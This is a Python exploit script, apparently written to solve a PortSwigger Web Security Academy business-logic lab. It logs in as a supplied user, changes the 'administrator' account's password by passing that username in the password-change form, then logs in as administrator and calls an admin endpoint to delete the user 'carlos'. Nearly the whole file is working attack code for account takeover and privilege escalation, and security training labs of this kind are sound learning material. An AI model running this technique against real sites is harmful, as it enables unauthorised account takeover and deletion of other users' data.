import requests
import json
import sys
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
  
# This method fetches the csrf token from url and returns csrf token
def get_csrf_token(session, url):
    r = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find("input", {'name': 'csrf'})
    if csrf_input:
        csrf = csrf_input['value']
    else:
        raise ValueError("CSRF token not found")
    return csrf

# Retrieve csrf token from get_csrf_token method for every post request
def login(session, login_url, main_url):
    csrf_token = get_csrf_token(session, login_url)
    # Login as the user
    print("===================================================================") 
    user_name_login = input("Please enter username to login: ")
    print("===================================================================") 
    password_login = input("Please enter password to login: ")
    print("===================================================================") 
    print("(+) Logging in as the user: ", user_name_login)
    print("===================================================================") 
    data_login = {"csrf": csrf_token, "username": user_name_login, "password": password_login}
    r = session.post(login_url, data=data_login, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("===================================================================") 
        print("(+) Successfully logged in as the user: ", user_name_login)
        print("===================================================================") 
        if "Admin panel" in r.text:
            print("===================================================================") 
            print("(+) Successfully esclated admin previlliges")
            deleting_url = main_url+ "/admin/delete?username=carlos"
            deleting_user_res = session.get(deleting_url, verify=False, proxies=proxies)
            if "Congratulations" in deleting_user_res.text:
                print("===================================================================") 
                print("(+) Successfully exploited the business logic vulnerability Lab")
            else:
                print("===================================================================") 
                print("(-) Could not exploit the business logic vulnerability.")
                sys.exit(-1)
        else:
            print("Changing Administrator password")
            loged_user = main_url + "/my-account?id=" + user_name_login
            csrf_token = get_csrf_token(session, loged_user)
            update_password_url = main_url+ "/my-account/change-password"
            #updating_email = user_name_login + "@dontwannacry.com"
            data_update_password = {"csrf": csrf_token, "username": "administrator","new-password-1": "administrator","new-password-2":"administrator"}
            data_update_password_res = session.post(update_password_url, data=data_update_password, verify=False, proxies=proxies)
            if "Password changed successfully!" in data_update_password_res.text:
                print("administrator account Password changed successfully!")
                print("Now login as administrator")
                login(session, login_url, main_url)
                sys.exit(-1)
            else:
                print("Could not change administrator account password")
    else:
        print("(-) Could not login as user.", user_name_login)

#def delete_user(session, login_url, main_url):

def main():    
    if len(sys.argv) != 2:
        print("Warning!\nNot enough arguments! Please provide by following below usage command and Example")
        print("(+) Usage command: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    session = requests.Session()
    main_url = sys.argv[1]
    login_url = main_url + "/login"
    #register_url = main_url + "/register"
    #cart_url = main_url + "/cart"
    #coupon_url = cart_url+ "/coupon"
    #check_out_url = cart_url + "/checkout"
    #main_url=https://0a7f002404ed213e80d521c900ae00e6.web-security-academy.net
    #register(session, register_url, main_url)
    login(session, login_url, main_url)
    #update_email(session, main_url)
    #delete_user(session, login_url, main_url)

if __name__ == "__main__":
    main()